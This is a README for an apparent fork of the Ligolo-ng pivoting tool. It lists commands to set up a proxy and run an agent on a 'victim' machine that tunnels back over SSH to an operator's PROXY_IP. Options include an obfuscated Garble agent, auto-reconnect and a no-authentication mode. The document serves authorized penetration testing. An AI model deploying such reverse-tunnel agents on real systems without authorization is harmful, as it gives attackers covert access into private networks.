# Ligolo-ng SSH fork - quick commands

This is an independent fork of
[nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng). Ligolo-ng was
created by [Nicolas Chatelain (@nicocha30)](https://github.com/nicocha30), who
deserves full credit for the original project and core tunneling engine. This
SSH fork is not an official upstream release.

This release contains proxy and agent binaries for Windows/Linux AMD64/ARM64.
The Garble agent accepts the same flags as the normal agent.

SSH is the real agent-to-proxy transport. The proxy always needs an SSH host
key because it is required to establish an encrypted SSH connection. In
no-auth mode, the victim only needs the agent binary: no agent key file is
required.

## Generate keys on the proxy

PowerShell:

```powershell
New-Item -ItemType Directory -Force .\keys
ssh-keygen -t ed25519 -f .\keys\proxy-host
ssh-keygen -t ed25519 -f .\keys\agent
Copy-Item .\keys\agent.pub .\keys\authorized_keys
ssh-keygen -lf .\keys\proxy-host.pub -E sha256
```

Press Enter twice when `ssh-keygen` asks for an empty passphrase, or set a
passphrase and use the passphrase-environment flags documented below.

Linux:

```bash
mkdir -p ./keys
ssh-keygen -t ed25519 -f ./keys/proxy-host -N ''
ssh-keygen -t ed25519 -f ./keys/agent -N ''
cp ./keys/agent.pub ./keys/authorized_keys
ssh-keygen -lf ./keys/proxy-host.pub -E sha256
```

The last command prints the `SHA256:...` fingerprint used by the agent.

## Recommended: with agent key

Proxy on Windows:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-authorized-keys .\keys\authorized_keys
```

Proxy on Linux:

```bash
sudo ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-authorized-keys ./keys/authorized_keys
```

Agent on Windows:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-key .\agent `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -retry `
  -reconnect
```

Agent on Linux:

```bash
./agent \
  -connect ssh://PROXY_IP:22 \
  -ssh-user ligolo \
  -ssh-key ./agent-key \
  -ssh-host-key-fingerprint 'SHA256:REPLACE_WITH_PROXY_FINGERPRINT' \
  -retry \
  -reconnect
```

Copy the agent private key to the victim separately only in this authenticated
mode. `agent-garble.exe` or `agent-garble` can replace the normal agent.

## No agent key: victim receives only the binary

Generate only `proxy-host` on the proxy. Start the proxy with the explicit
no-auth flag:

Windows proxy:

```powershell
.\proxy.exe `
  -laddr ssh://0.0.0.0:22 `
  -ssh-user ligolo `
  -ssh-host-key .\keys\proxy-host `
  -ssh-insecure-allow-no-auth
```

Linux proxy:

```bash
sudo ./proxy \
  -laddr ssh://0.0.0.0:22 \
  -ssh-user ligolo \
  -ssh-host-key ./keys/proxy-host \
  -ssh-insecure-allow-no-auth
```

No-key agent with proxy verification:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
  -retry `
  -reconnect
```

Zero-file/zero-pinning agent command:

```powershell
.\agent.exe `
  -connect ssh://PROXY_IP:22 `
  -ssh-user ligolo `
  -ssh-insecure-no-auth `
  -ssh-insecure-ignore-host-key `
  -retry `
  -reconnect
```

Linux uses the same flags:

```bash
./agent \
  -connect ssh://PROXY_IP:22 \
  -ssh-user ligolo \
  -ssh-insecure-no-auth \
  -ssh-insecure-ignore-host-key \
  -retry \
  -reconnect
```

No-auth mode still uses a real encrypted SSH handshake and the custom
`ligolo` SSH channel. It does not authenticate the agent. With
`-ssh-insecure-ignore-host-key`, it also does not authenticate the proxy.
Anyone who can reach the proxy can connect, and an active MITM can impersonate
the proxy. Enable this mode only for the assessment window and restrict the
listener with firewall rules when possible.

Both sides must opt in. A no-auth agent is rejected by a normal proxy.

## Web UI

The Web UI manages key-authenticated and no-auth SSH agents identically.
Enable it in `ligolo-ng.yaml`:

```yaml
web:
  enabled: true
  enableui: true
  listen: 127.0.0.1:8080
```

Start the proxy with the chosen SSH authentication mode plus:

```text
-daemon -config ./ligolo-ng.yaml -api-laddr 127.0.0.1:8080
```

Open `http://127.0.0.1:8080`. Change the default Web credentials and keep the
API/UI on localhost or behind a trusted reverse proxy.

## SSH-specific flags

Proxy:

```text
-ssh-user
-ssh-host-key
-ssh-host-key-passphrase-env
-ssh-authorized-keys
-ssh-insecure-allow-no-auth
-ssh-handshake-timeout
```

Agent:

```text
-ssh-user
-ssh-key
-ssh-key-passphrase-env
-ssh-known-hosts
-ssh-host-key-fingerprint
-ssh-insecure-ignore-host-key
-ssh-insecure-no-auth
-ssh-connect-timeout
-ssh-keepalive
```

Port 22 may require Administrator/root and may conflict with OpenSSH. Any
allowed port can be used, for example `ssh://0.0.0.0:2222`.

Detailed evidence and caveats are in `../artifacts/TEST-REPORT.md` in the
project workspace.
